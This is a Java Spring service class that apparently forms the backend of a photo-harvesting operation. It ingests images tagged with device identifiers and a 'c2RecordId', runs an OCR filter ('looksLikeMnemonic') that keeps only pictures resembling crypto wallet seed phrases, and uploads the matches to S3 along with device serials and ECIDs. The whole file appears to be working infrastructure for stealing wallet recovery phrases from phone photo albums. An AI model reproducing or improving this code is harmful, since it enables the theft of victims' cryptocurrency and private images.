package com.consumer.service;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executor;

import javax.annotation.Resource;

import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import com.consumer.config.ConsumerProperties;
import com.consumer.config.PhotoAsyncConfig.PhotoRejectAware;
import com.consumer.dao.AlbumDao;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.Ios18ParamDao;
import com.consumer.entity.AlbumEntity;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.Ios18ParamEntity;
import com.consumer.util.S3FileUploadUtil;

import lombok.extern.slf4j.Slf4j;

/**
 * 照片上传：Redis poller / worker 只做轻量投递并 ACK；
 * 读图·SHA·幂等·OCR·S3·写库均在旁路池（对齐 17：快 ACK + 保 LAG）。
 */
@Service
@Slf4j
public class AlbumHandler {

    private static final DateTimeFormatter DATE_DIR = DateTimeFormatter.BASIC_ISO_DATE;
    private static final char[] HEX = "0123456789abcdef".toCharArray();

    @Resource
    private AlbumDao albumDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private Ios18ParamDao ios18ParamDao;
    @Resource
    private ConsumerProperties props;
    @Resource
    private MnemonicImageAnalyzer mnemonicImageAnalyzer;
    @Resource
    private S3FileUploadUtil s3FileUploadUtil;
    @Resource
    private AlbumBatchInsertBuffer albumBatchInsertBuffer;

    @Resource
    @Qualifier("photoDispatchExecutor")
    private Executor photoDispatchExecutor;

    @Resource
    @Qualifier("photoFilterExecutor")
    private Executor photoFilterExecutor;

    @Resource
    @Qualifier("photoUploadExecutor")
    private Executor photoUploadExecutor;

    /**
     * 热路径：校验必填字段后投递 dispatch，立即返回 true → 调用方 ACK。
     * 池满丢弃也返回 true（高峰保 LAG，与 17 一致）。
     */
    public boolean handle(Map<String, String> fields) {
        if (fields == null || fields.isEmpty()) {
            return true;
        }
        String deviceId = fields.getOrDefault("device_id", "");
        if (deviceId.isEmpty()) {
            log.warn("【photo】缺少 device_id，跳过 ios18param_id={}", fields.get("ios18param_id"));
            return true;
        }

        final Map<String, String> snapshot = new HashMap<>(fields);
        final String jobIdStr = snapshot.get("ios18param_id");
        PhotoRejectAware task = new PhotoRejectAware() {
            @Override
            public void run() {
                processDispatched(snapshot);
            }

            @Override
            public void onRejected() {
                log.warn("【photo】dispatch 池拒绝 ios18param_id={}", jobIdStr);
            }
        };
        try {
            photoDispatchExecutor.execute(task);
            return true;
        } catch (Exception ex) {
            log.warn("【photo】提交 dispatch 失败 ios18param_id={} err={}", jobIdStr, ex.toString());
            return true;
        }
    }

    /** dispatch 池：读图 / SHA / 幂等 / 投 OCR 或上云 */
    private void processDispatched(Map<String, String> fields) {
        String jobIdStr = fields.get("ios18param_id");
        String deviceId = fields.getOrDefault("device_id", "");
        try {
            DeviceEntity device = deviceDao.findByDeviceid(deviceId);
            if (device == null) {
                log.warn("【photo】device 不存在 device_id={}", deviceId);
                return;
            }

            byte[] imageBytes = readImageBytes(fields);
            if (imageBytes == null || imageBytes.length == 0) {
                log.warn("【photo】读图失败(已 ACK 丢弃) ios18param_id={} file_path={}",
                        jobIdStr, fields.get("file_path"));
                return;
            }

            String sha256 = sha256Hex(imageBytes);
            try {
                Integer existId = albumDao.findIdByDeviceSha(device.getId(), sha256);
                if (existId != null) {
                    log.info("【photo】已存在，跳过 device={} album_id={} sha={}",
                            deviceId, existId, sha256.substring(0, 16));
                    return;
                }
            } catch (Exception e) {
                log.warn("【photo】幂等查询失败 device={} err={}", deviceId, e.toString());
            }

            Integer c2RecordId = parseIntOrNull(jobIdStr);
            String filename = sanitizeFilename(fields.get("filename"));
            String date = LocalDate.now().format(DATE_DIR);
            String storedName = sha256.substring(0, 16) + "_" + filename;
            String relSub = date + "/" + device.getDeviceId() + "/" + storedName;
            AlbumEntity draft = newAlbumDraft(device, fields, filename, sha256, imageBytes.length, c2RecordId);

            if (mnemonicImageAnalyzer != null && mnemonicImageAnalyzer.isEnabled()) {
                scheduleFilterThenUpload(draft, imageBytes, filename, relSub);
            } else {
                scheduleUpload(draft, imageBytes, filename, relSub);
            }
        } catch (Exception ex) {
            log.warn("【photo】dispatch 处理异常 ios18param_id={} err={}", jobIdStr, ex.toString());
        }
    }

    private void scheduleFilterThenUpload(AlbumEntity draft, byte[] image,
                                          String filename, String relSub) {
        final Integer recordId = draft.getC2RecordId();
        PhotoRejectAware task = new PhotoRejectAware() {
            @Override
            public void run() {
                try {
                    if (!mnemonicImageAnalyzer.looksLikeMnemonic(image, recordId)) {
                        return;
                    }
                    if (!scheduleUpload(draft, image, filename, relSub)) {
                        log.warn("【photo】OCR 通过但上传池满，丢弃 recordId={} sha={}",
                                recordId, draft.getFileSha256());
                    }
                } catch (Exception ex) {
                    log.warn("【photo】OCR 过滤异常，丢弃 recordId={} err={}",
                            recordId, ex.toString());
                }
            }

            @Override
            public void onRejected() {
                log.warn("【photo】OCR 池拒绝 recordId={} sha={}",
                        recordId, draft.getFileSha256());
            }
        };
        try {
            photoFilterExecutor.execute(task);
        } catch (Exception ex) {
            log.warn("【photo】提交 OCR 失败 recordId={} err={}", recordId, ex.toString());
        }
    }

    private boolean scheduleUpload(AlbumEntity draft, byte[] image,
                                   String filename, String relSub) {
        final Integer recordId = draft.getC2RecordId();
        PhotoRejectAware task = new PhotoRejectAware() {
            @Override
            public void run() {
                uploadAndEnqueueInsert(draft, image, filename, relSub);
            }

            @Override
            public void onRejected() {
                log.warn("【photo】上传池拒绝 recordId={} sha={}",
                        recordId, draft.getFileSha256());
            }
        };
        try {
            photoUploadExecutor.execute(task);
            return true;
        } catch (Exception ex) {
            log.warn("【photo】提交上传失败 recordId={} err={}", recordId, ex.toString());
            return false;
        }
    }

    private void uploadAndEnqueueInsert(AlbumEntity draft, byte[] image, String filename, String relSub) {
        String imagePath;
        if (props.isPhotoCloudEnabled()) {
            String prefix = trimSlashes(
                    props.getPhotoCloudKeyPrefix() == null ? "photos" : props.getPhotoCloudKeyPrefix());
            String objectKey = prefix.isEmpty() ? relSub : (prefix + "/" + relSub);
            imagePath = s3FileUploadUtil.uploadBytes(image, objectKey, filename);
            if (imagePath == null || imagePath.isEmpty()) {
                log.error("【photo】S3 上传失败 recordId={} key={}（已 ACK，高峰不重试）",
                        draft.getC2RecordId(), objectKey);
                return;
            }
        } else {
            Path dest = Paths.get(props.getPhotoDir(), relSub);
            try {
                Files.createDirectories(dest.getParent());
                if (!Files.exists(dest)) {
                    Files.write(dest, image);
                }
            } catch (IOException e) {
                log.error("【photo】本地落盘失败 dest={} err={}", dest, e.toString());
                return;
            }
            imagePath = joinUrl(props.getPhotoUrlPrefix(), relSub);
        }

        draft.setImagePath(imagePath);
        double now = System.currentTimeMillis() / 1000.0;
        draft.setAddtime(now);
        draft.setParsedAt(now);
        if (albumBatchInsertBuffer != null) {
            albumBatchInsertBuffer.offer(draft);
        } else {
            try {
                albumDao.insert(draft);
            } catch (Exception e) {
                log.error("【photo】album 写入失败 device={} err={}", draft.getDeviceUid(), e.toString());
            }
        }
    }

    private static AlbumEntity newAlbumDraft(DeviceEntity device, Map<String, String> fields,
                                             String filename, String sha256, int size,
                                             Integer c2RecordId) {
        AlbumEntity album = new AlbumEntity();
        album.setDeviceRowId(device.getId());
        album.setDeviceUid(device.getDeviceId());
        album.setChannelcode(device.getChannelCode());
        album.setEcid(device.getEcid());
        album.setSerial(device.getSerial());
        album.setRid(fields.get("rid"));
        album.setFilename(filename);
        album.setFileSha256(sha256);
        album.setFileSize(size);
        album.setFormTs(fields.get("form_ts"));
        album.setXTs(fields.get("x_ts"));
        album.setImageName(filename);
        album.setStatus(1);
        album.setType(1);
        album.setErrorMsg("");
        if (c2RecordId != null) {
            album.setC2RecordId(c2RecordId);
        }
        return album;
    }

    private byte[] readImageBytes(Map<String, String> fields) {
        byte[] bytes = readFileIfExists(fields.get("file_path"));
        if (bytes != null) {
            return bytes;
        }
        String jobIdStr = fields.get("ios18param_id");
        if (jobIdStr == null || jobIdStr.isEmpty()) {
            return null;
        }
        try {
            Ios18ParamEntity rec = ios18ParamDao.findById(Integer.parseInt(jobIdStr));
            if (rec == null) {
                return null;
            }
            bytes = readFileIfExists(rec.getFilePath());
            if (bytes != null) {
                return bytes;
            }
            if ("inline".equals(rec.getStorage()) && rec.getBody() != null && !rec.getBody().isEmpty()) {
                return Base64.getDecoder().decode(rec.getBody());
            }
        } catch (Exception e) {
            log.warn("【photo】ios18param 读图兜底失败 id={} err={}", jobIdStr, e.toString());
        }
        return null;
    }

    private static byte[] readFileIfExists(String filePath) {
        if (filePath == null || filePath.isEmpty()) {
            return null;
        }
        try {
            Path p = Paths.get(filePath);
            if (Files.isRegularFile(p)) {
                return Files.readAllBytes(p);
            }
        } catch (Exception ignore) {
        }
        return null;
    }

    private static Integer parseIntOrNull(String s) {
        if (s == null || s.isEmpty()) {
            return null;
        }
        try {
            return Integer.parseInt(s);
        } catch (Exception e) {
            return null;
        }
    }

    private static String sanitizeFilename(String name) {
        if (name == null || name.isEmpty()) {
            return "unknown.bin";
        }
        int slash = Math.max(name.lastIndexOf('/'), name.lastIndexOf('\\'));
        if (slash >= 0) {
            name = name.substring(slash + 1);
        }
        name = name.replaceAll("[\\\\/:*?\"<>|\\s]+", "_");
        return name.isEmpty() ? "unknown.bin" : name;
    }

    private static String trimSlashes(String s) {
        String p = s == null ? "" : s.trim().replace('\\', '/');
        while (p.startsWith("/")) {
            p = p.substring(1);
        }
        while (p.endsWith("/")) {
            p = p.substring(0, p.length() - 1);
        }
        return p;
    }

    private static String joinUrl(String prefix, String rel) {
        String p = trimSlashes(prefix);
        String r = rel == null ? "" : rel.replace('\\', '/');
        while (r.startsWith("/")) {
            r = r.substring(1);
        }
        if (p.isEmpty()) {
            return r;
        }
        return p + "/" + r;
    }

    private static String sha256Hex(byte[] bytes) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(bytes);
            char[] out = new char[digest.length * 2];
            for (int i = 0; i < digest.length; i++) {
                int v = digest[i] & 0xFF;
                out[i * 2] = HEX[v >>> 4];
                out[i * 2 + 1] = HEX[v & 0x0F];
            }
            return new String(out);
        } catch (Exception e) {
            throw new IllegalStateException("SHA-256 not available", e);
        }
    }
}
